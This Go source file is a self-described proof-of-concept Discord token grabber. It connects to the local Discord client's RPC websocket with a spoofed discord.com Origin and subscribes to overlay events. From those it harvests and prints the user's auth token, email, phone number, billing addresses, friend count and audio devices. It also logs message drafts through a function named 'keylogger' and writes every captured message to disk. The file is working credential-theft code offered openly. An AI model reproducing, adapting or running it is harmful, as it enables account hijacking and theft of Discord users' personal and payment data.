package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"

	"github.com/gorilla/websocket"
)

var (
	socketURL = "ws://127.0.0.1:6463/?v=1&encoding=json"
	headers   = http.Header{}
	i         int // part of logging all the data
)

func initPayload(c *websocket.Conn) {

	var ready sendReady
	ready.Cmd = "SUBSCRIBE"
	ready.Evt = "OVERLAY"
	ready.Nonce = "test"
	var con = &connect{
		Cmd: "OVERLAY",
		Args: &connectArgs{
			Type: "CONNECT",
			Pid:  4,
		},
		Nonce: "test",
	}
	c.WriteJSON(ready)
	c.WriteJSON(con)
}

func logToken(payload *overlayInit) {
	user := payload.User
	fmt.Printf("Welcome %s#%s! It seems your token has been logged...\nToken: %s\nPhone: %s\nEmail: %s\n", user.Username, user.Discriminator, payload.Token, user.PhoneNumber, user.Email)
	fmt.Printf("Wait but that isn't all!\n\nBilling Information:\n")
	for _, addy := range payload.PaymentInfo {
		fmt.Printf("	Address1: %s\n	Address2: %s\n	Email: %s\n	Name: %s\n	City: %s\n	PostalCode: %s\n	State: %s\n	Country: %s\n\n", addy.Address.FirstAddress, addy.Address.SecondAddress, addy.Email, addy.Address.Name, addy.Address.City, addy.Address.PostalCode, addy.Address.State, addy.Address.Country)
	}
	friends := 0
	for _, f := range payload.Friends {
		if f == 1 {
			friends++
		}
	}
	fmt.Printf("I could get even more information as well. Did you know that you have %v friends?\n\n", friends)

	fmt.Printf("I can even get your input and output devices!\n")
	fmt.Printf("\nInput:\n")
	for _, d := range payload.MediaState.Input {
		fmt.Printf("	%s\n", d.Name)
	}
	fmt.Printf("\nOutput:\n")
	for _, d := range payload.MediaState.Output {
		fmt.Printf("	%s\n", d.Name)
	}
	fmt.Println("\nAnyways follow me on github and checkout this repo!\nhttps://github.com/post04\nhttps://github.com/post04/token-grabber-poc")
}

func updateToken(p *tokenUpdate) {
	fmt.Println("Token update recieved:", p.Token)
}

func profileInfo(p *userProfileFetch) {
	if p.PremiumSince != nil {
		fmt.Printf("%s#%s has nitro!\n", p.User.Username, p.User.Discriminator)
	}
	if p.PremiumGuildSince != nil {
		fmt.Printf("%s#%s has a nitro boost on!\n", p.User.Username, p.User.Discriminator)
	}
	fmt.Printf("%s#%s has %v connected accounts!\n", p.User.Username, p.User.Discriminator, len(p.ConnectedAccounts))
	for _, ca := range p.ConnectedAccounts {
		fmt.Printf("	Service: %s\n	Name: %s\n	Verified: %t\n	ID: %s\n\n", ca.Type, ca.Name, ca.Verified, ca.ID)
	}
}

func keylogger(p *draftChange) {
	fmt.Printf("%s -> %s\n", p.ChannelID, p.Content)
}

// part of logging all the data
func save(b []byte) {
	os.WriteFile(fmt.Sprintf("./data/%v.json", i), b, 0064)
	i++
}

func main() {
	fmt.Println("Attempting to connect to websocket.")
	headers["Origin"] = []string{"https://discord.com"}
	c, _, err := websocket.DefaultDialer.Dial(socketURL, headers)
	if err != nil {
		panic(err)
	}

	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			fmt.Println("\"" + err.Error() + "\"")
			if err.Error() == "websocket: close 1000 (normal): User logout" {
				fmt.Println("User logged out of client!")

				return
			}
			c.Close()
			return
		}
		save(message) // part of logging all the data
		payload := &base{}
		err = json.Unmarshal(message, &payload)
		if err != nil {
			fmt.Println(err)
			return
		}

		switch payload.Event {
		case "READY":
			fmt.Println("Ready triggered!")
			initPayload(c)
		default:
			for _, p := range payload.Data.Payloads {
				a := &basePayload{}
				b, err := json.Marshal(p)
				if err != nil {
					fmt.Println(err)
					return
				}
				err = json.Unmarshal(b, &a)
				if err != nil {
					fmt.Println(err)
					return
				}
				switch a.Type {
				case "OVERLAY_INITIALIZE":
					c := &overlayInit{}
					err = json.Unmarshal(b, &c)
					if err != nil {
						fmt.Println(err)
						return
					}
					logToken(c)
					break
				case "UPDATE_TOKEN":
					c := &tokenUpdate{}
					err = json.Unmarshal(b, &c)
					if err != nil {
						fmt.Println(err)
						return
					}
					updateToken(c)
					break
				case "STORAGE_SYNC":
					// all the data about emojis, friends, etc.
					break
				case "USER_PROFILE_FETCH_SUCCESS":
					// contains data like connected accounts and whatnot
					// c := &userProfileFetch{}
					// err = json.Unmarshal(b, &c)
					// if err != nil {
					// 	fmt.Println(err)
					// 	return
					// }
					// profileInfo(c)
					break
				case "DRAFT_CHANGE":
					c := &draftChange{}
					err = json.Unmarshal(b, &c)
					if err != nil {
						fmt.Println(err)
						return
					}
					keylogger(c)
				default:
					break
				}
			}
		}
	}
	main()
}
